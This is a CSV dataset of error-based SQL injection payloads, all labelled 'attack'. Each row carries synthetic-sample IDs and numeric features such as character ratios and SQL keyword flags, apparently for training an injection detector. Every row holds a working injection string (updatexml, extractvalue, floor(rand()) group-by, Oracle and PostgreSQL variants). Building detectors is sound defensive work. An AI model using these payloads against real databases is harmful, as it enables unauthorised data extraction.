id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000387,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000018,1.040983340948917,188.70125936233626,31.29874063766373,3.893961035426654,48.29874063766373,47.0,66.0,27.40251872467254,0.25596086713740585,0.24907240825087795,0.34976125413953074,0.14520547047218546,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.402518724672538,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.701259362336269,2.0,0.0,1.0,0.0,0.29874063766373105,0.701259362336269,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000388,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000021,2.6339021795292803,199.4742576457492,34.621499271833414,3.7537252355812467,56.55374817958352,37.514002912666356,80.96025473308282,24.44625182041647,0.2848068211618473,0.18758631052687752,0.40533982091646237,0.12226704739481277,0.6892503640832942,0.0,2.0,0.0,0.6892503640832943,1.6892503640832943,0.0,14.689250364083293,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,4.378500728166589,0.6892503640832944,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.0677510922498827,0.0,1.0,0.6892503640832943,0.6892503640832943,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31074963591670557,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.757001456333176
SMOTE_000389,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000081,1.169834949670374,225.82582470733652,32.65940936280569,3.932910613054422,81.0,42.27527490244551,78.57232171647395,23.978228088417065,0.3596277614714233,0.18681831940053126,0.34742327698302755,0.10613064214501791,2.6811812743886225,0.0,0.0,0.0,1.1102230246251565e-16,1.6594093628056887,0.0,13.318818725611377,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.978228088417066,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.6594093628056887,0.0,0.6594093628056887,0.0,0.34059063719431126,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.659409362805689
SMOTE_000390,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,1.9286321143262806,325.7775721024777,39.296262017079606,4.055765485423876,111.29626201707961,58.67401922732737,118.05177643757514,37.75551442049553,0.3419991602016679,0.1799232224967187,0.36236025454475435,0.11571736275685904,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.918504806831844,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,6.837009613663686,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.45925240341592166,6.459252403415921,3.0,0.45925240341592166,1.0,1.0,0.5407475965840783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.459252403415922
SMOTE_000391,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,1.2106830699143267,332.80094970805317,36.30663500973156,3.8357295544945313,103.45308007785249,60.54691992214752,132.4142197275163,36.38672998053688,0.31189137676293466,0.1817793782966627,0.39691791533564885,0.10941132960475375,1.2265400389262426,0.0,0.0,0.0,2.0,2.0,0.0,24.160189941610636,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,0.30663500973156066,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000392,attack,error,-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000028,0.4583414647564102,325.5706030491989,34.85721790461828,3.6095527444927713,86.85774323694623,48.57112838152688,133.9989493353441,56.14278209538172,0.2669218328767374,0.14915843605355777,0.41146434477756794,0.1724553862921369,0.8572179046182793,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,28.428346286145164,2.7755575615628914e-17,2.5716537138548374,0.14278209538172115,22.999999999999996,0.8572179046182793,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000393,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000120,0.6420058813878621,316.89065389606094,40.0,4.021684893934911,104.16719616881828,63.0,115.33439233763656,34.389065389606095,0.3287337981708147,0.19892629502871717,0.3638144941563803,0.10852541264408788,0.19453269480304702,0.8054673051969531,2.0,0.0,2.0,2.0,0.0,20.389065389606095,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.1945326948030469,0.8054673051969531,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000394,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""ijop""  =  ""ijop",nearest_attack_euclidean,R000073,0.40000592336433743,329.01534125453765,39.0,3.962706816047756,110.0,55.0,126.1560067896037,37.85933446493395,0.33447843806672295,0.16723921903336147,0.38322600528468215,0.11505633761523341,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.859334464933948,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000395,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,0.6475317758109997,285.0148798549302,36.144982836418606,3.9492274373525205,106.69515447223257,35.0,106.73979403702324,36.57993134567441,0.3744714298168238,0.12280963173463824,0.37440756887066123,0.12831136957787673,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.289965672837205,0.28996567283720664,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.8550171635813968,0.14498283641860327,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000396,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000087,1.3543576661702479,322.6201398492314,39.577517481153926,4.009675923120767,106.46510488692356,63.0,118.15503496230785,35.0,0.3299381578652126,0.19530550593720744,0.3662532773435759,0.10850305885400414,0.4224825188460746,0.5775174811539254,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.42248251884607446,0.5775174811539254,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000397,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000051,0.5726379433806107,332.2717994707116,32.27179947071159,3.4410709404801736,81.0,49.0,146.0,56.2717994707116,0.24377676691335037,0.14746989603400207,0.43940009838702654,0.16935323866562105,0.27179947071159494,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,31.0,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.0,0.2717994707115949,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000398,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000100,0.5047479693773878,219.2906561958387,31.290656195838686,3.8740969265056004,78.16262478335474,37.0,79.41868760832263,24.709343804161314,0.35641831258769424,0.1687265612443746,0.3621718574212445,0.1126832687466866,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.7093438041613152,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.709343804161315,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000399,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",nearest_attack_euclidean,R000063,1.0144638204689098,201.8998560774101,30.0,3.539176561000594,48.28564575114767,36.70004797419663,88.25703320183628,28.657129150229533,0.2386089125828666,0.18296331832738244,0.43638255982746993,0.142045209262281,4.0,0.0,0.0,0.0,0.3285645751147672,2.0,0.0,16.657129150229533,2.7755575615628914e-17,-1.1102230246251565e-16,5.342870849770466,2.3285645751147666,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.6571291502295342,0.0,0.0,0.3285645751147671,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.985693725344301
SMOTE_000400,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,0.13349247650430837,314.9713907196041,38.057982079988356,4.0183771447044325,110.0,55.0,114.62349823967392,35.347892479930124,0.34944109731835227,0.17472054865917613,0.3636499783419974,0.11218837568047424,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.347892479930128,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000401,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000150,3.990668700007712,194.8872600356318,35.05835618708269,3.7839766023117285,57.64589046770671,35.76657525166926,78.12068478396255,23.354109532293286,0.2973302055730211,0.18295523748146406,0.40022156815711313,0.11949298878840174,0.4708219064586574,0.0,2.0,0.0,0.4708219064586575,1.4708219064586574,0.0,14.470821906458657,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.941643812917315,0.47082190645865757,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.4124657193759727,0.0,1.0,0.47082190645865757,0.47082190645865757,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5291780935413425,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.88328762583463
SMOTE_000402,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000072,0.9065187698880761,332.548368387391,39.0,3.874919590030364,104.06449118318798,55.0,133.0,40.483877204203004,0.3128673384862107,0.16539969464614462,0.39996653432613155,0.1217664325415131,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,1.4838772042030024,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000403,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000031,0.7943494211233112,340.11985859221875,32.94383031066252,3.317925737275674,77.47191515533126,47.47191515533126,157.35205656311248,57.82397171844376,0.22776649645453578,0.13955950509305143,0.46266437551531747,0.1700096229370953,0.0,0.0,0.8239717184437534,0.0,1.1102230246251565e-16,2.0,0.0,32.17602828155625,2.7755575615628914e-17,-1.1102230246251565e-16,0.0,22.82397171844375,0.0,0.0,0.0,0.8239717184437534,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.17602828155624628,0.8239717184437536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000404,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000048,0.4128923182353177,190.92460478646316,34.6037408058015,3.970870796035051,50.320863980661656,46.471654407735336,66.26417279613233,27.867913601933836,0.26338922045923113,0.24352545852273433,0.3470790519732454,0.1460062690447892,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.867913601933834,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.13208639806616562,0.8679136019338344,0.13208639806616568,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.132086398066166
SMOTE_000405,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,0.9935714912223899,328.2377748310552,36.26984755233225,3.8088234368004303,100.4603048953355,60.841219581341996,131.82518322070348,35.11106713367425,0.3074336228800483,0.18550388137760981,0.4002500593868874,0.10681243635545457,0.0,0.0,0.0,0.0,2.0,1.7301524476677494,0.0,24.3809146860065,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.73015244766775,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,0.7301524476677497,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.730152447667749
SMOTE_000406,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000044,1.144559513554747,201.1177386248587,33.45752651387319,3.6756205510452635,51.202685597112314,40.0,83.91505302774638,26.0,0.2543314180828424,0.1989870005176101,0.41734003106310097,0.12934155033644656,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.45752651387318816,0.5424734861268118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000407,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000101,0.3998934366890362,190.0,26.576530722668718,3.4046815773888275,37.27040783199384,45.30612289067487,83.84693855466256,23.576530722668718,0.19616004122102026,0.238453278371973,0.44129967660348723,0.12408700380351957,0.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.576530722668718,2.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000408,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000099,0.6457996118966354,282.4985825969876,36.780056696120496,3.8924097831769475,99.2199433038795,35.0,109.39886607759006,38.879773215518014,0.3516217349806686,0.1240532384477184,0.3867254970570296,0.13759952951458343,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.879773215518014,2.0,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.2199433038795031,0.7800566961204969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000409,attack,error,"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- gkcl",nearest_attack_euclidean,R000030,0.20544773125565105,333.88287098002553,35.058564509987235,3.5447550753726054,85.40995156991063,48.941435490012765,142.53148392010215,57.0,0.25581559583587027,0.14658194552740614,0.4268835679169113,0.17071889071981228,0.0,0.0,2.058564509987233,0.0,1.1102230246251565e-16,2.0,0.0,29.882870980025533,2.7755575615628914e-17,0.17569352996169874,0.941435490012767,24.05856450998723,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.941435490012767,0.05856450998723295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
